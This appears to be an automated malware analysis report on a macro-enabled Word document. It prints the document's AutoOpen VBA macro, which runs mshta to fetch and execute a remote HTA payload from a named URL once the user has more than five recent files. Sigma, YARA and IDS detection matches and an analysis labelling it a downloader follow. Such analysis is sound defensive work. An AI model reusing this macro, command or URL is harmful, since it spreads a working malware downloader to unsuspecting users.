macros.vba_code:
Sub AutoOpen()
If Application.RecentFiles.Count > 5 Then
    Shell ("mshta https://christinadudley.com/public_html/cdudley/img/Defender/Dhcud0.hta")
End If
End Sub

sigma_analysis_results.rule_title: Remotely Hosted HTA File Executed Via Mshta.EXE
sigma_analysis_results.rule_description: Detects execution of the "mshta" utility with an argument containing the "http" keyword, which could indicate that an attacker is executing a remotely hosted malicious hta file

match_context.values: @{Product=Internet Explorer; CurrentDirectory=C:\Windows\system32\; OriginalFileName=MSHTA.EXE; Hashes=SHA1=2DF819323AB8BDB951828AEE26AF1F1720DDE946,MD5=197FC97C6A843BEBB445C1D9C58DCBDB,SHA256=64E7A255A1AF1B54FD9243FAACB76A6527513FECF1B26BC3C9B8D3824DC9BDF9,IMPHASH=42DA177DE2FAA97C3DFAEC9562772A7F; Description=Microsoft (R) HTML Application host; FileVersion=11.00.17134.1 (WinBuild.160101.0800); ParentCommandLine="C:\Program Files\Microsoft Office\Office16\WINWORD.EXE" /Automation -Embedding; CommandLine=mshta https://christinadudley.com/public_html/cdudley/img/Defender/Dhcud0.hta; EventID=1; ParentImage=C:\Program Files\Microsoft Office\Office16\WINWORD.EXE; IntegrityLevel=High; Image=C:\Windows\System32\mshta.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects a suspicious process spawning from one of the Microsoft Office suite products (Word, Excel, PowerPoint, Publisher, Visio, etc.)
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Markus Neis, FPT.EagleEye Team, Vadim Khrykov, Cyb3rEng, Michael Haag, Christopher Peacock @securepeacock, @scythe_io

sigma_analysis_results.rule_title: Potential Suspicious Browser Launch From Document Reader Process
sigma_analysis_results.rule_description: Detects when a browser process or browser tab is launched from an application that handles document files such as Adobe, Microsoft Office, etc. And connects to a web application over http(s), this could indicate a possible phishing attempt.

match_context.values: @{Hashes=SHA1=2DF819323AB8BDB951828AEE26AF1F1720DDE946,MD5=197FC97C6A843BEBB445C1D9C58DCBDB,SHA256=64E7A255A1AF1B54FD9243FAACB76A6527513FECF1B26BC3C9B8D3824DC9BDF9,IMPHASH=42DA177DE2FAA97C3DFAEC9562772A7F; CurrentDirectory=C:\Windows\system32\; OriginalFileName=MSHTA.EXE; Product=Internet Explorer; Description=Microsoft (R) HTML Application host; EventID=1; ParentCommandLine="C:\Program Files\Microsoft Office\Office16\WINWORD.EXE" /Automation -Embedding; CommandLine=mshta https://christinadudley.com/public_html/cdudley/img/Defender/Dhcud0.hta; FileVersion=11.00.17134.1 (WinBuild.160101.0800); ParentImage=C:\Program Files\Microsoft Office\Office16\WINWORD.EXE; IntegrityLevel=High; Image=C:\Windows\System32\mshta.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Office Application Initiated Network Connection To Non-Local IP
sigma_analysis_results.rule_description:
Detects an office application (Word, Excel, PowerPoint)  that initiate a network connection to a non-private IP addresses.
This rule aims to detect traffic similar to one seen exploited in CVE-2021-42292.
This rule will require an initial baseline and tuning that is specific to your organization.
sigma_analysis_results.rule_author: Christopher Peacock '@securepeacock', SCYTHE '@scythe_io', Florian Roth (Nextron Systems), Tim Shelton, Nasreddine Bencherchali (Nextron Systems)

match_context.values: @{SourceIsIpv6=true; DestinationPort=53; Initiated=true; Protocol=udp; SourceIp=c0a8:21a:0:0:88e1:689d:8c8a:ffff; DestinationIsIpv6=true; EventID=3; Image=C:\Program Files\Microsoft Office\Office16\WINWORD.EXE; SourcePort=62269; DestinationIp=808:808:2323:2323:2323:2323:2323:2323}

sigma_analysis_results.rule_description: Detects the creation of a new office macro files on the systems

crowdsourced_yara_results.description: This signature detects an office document with an embedded VBA project. While this is fairly common it is sometimes used for malicious intent.
crowdsourced_yara_results.author: InQuest Labs

crowdsourced_ids_results.rule_raw: alert ( gid:119; sid:279; rev:1; msg:"(http_inspect) invalid status line"; metadata: rule-type preproc; classtype:unknown;)

crowdsourced_ids_results.rule_raw: alert ( gid:129; sid:8; rev:2; msg:"(stream_tcp) data sent on stream after TCP reset sent"; metadata: policy max-detect-ips drop, rule-type preproc; classtype:protocol-command-decode;)

threat_severity.level_description: Severity HIGH because it was considered downloader. Other contributing factor was that it could not be run in sandboxes.

trid.file_type: Word Microsoft Office Open XML Format document (with Macro)
Word Microsoft Office Open XML Format document

crowdsourced_ai_results.analysis:
The macro code provided contains a subroutine named `AutoOpen()`, which is executed automatically when the document is opened. This behavior is characteristic of macros that may be attempting to perform actions without user consent, often associated with malicious intent.

1. Shell Command Execution: The line `Shell (\"mshta https://christinadudley.com/public_html/cdudley/img/Defender/Dhcud0.hta\")` indicates that the macro attempts to execute a command using `mshta`, which is a legitimate Windows utility for executing HTML applications (HTA). However, in this context, it is being used to open a potentially harmful HTA file from an external URL. This raises significant red flags as it suggests that the macro is designed to download and execute content from the internet, which is a common tactic employed by malware to deliver payloads or further exploit the system.

2. Conditional Execution Based on Recent Files: The condition `If Application.RecentFiles.Count > 5 Then` implies that the execution of the shell command is contingent upon the number of recent files opened in the application. This could be a method to avoid detection by only executing the malicious action under certain conditions, thereby obfuscating its true intent.

3. Potential for Persistence: While the macro does not explicitly show signs of persistence mechanisms like writing to the registry or modifying security settings, the use of `AutoOpen()` itself can be seen as a form of persistence since it ensures that the macro runs every time the document is opened.

4. Obfuscation and Misleading Comments: Although there are no visible decoy comments in the provided code, the overall structure and the use of an external link suggest an attempt to mislead users into thinking the action is benign or necessary.

In conclusion, the combination of executing an external HTA file, conditional execution based on recent activity, and the use of the `AutoOpen()` subroutine strongly indicate that these macros exhibit malicious behavior aimed at compromising the user's system.

The provided VBA code includes an AutoOpen subroutine that executes when the document is opened. It first checks if the number of recent files opened in the application is greater than five. If this condition is met, it proceeds to execute a shell command. This command utilizes "mshta.exe" to access and run an external HTA (HTML Application) file located at the URL "https://christinadudley.com/public_html/cdudley/img/Defender/Dhcud0.hta".
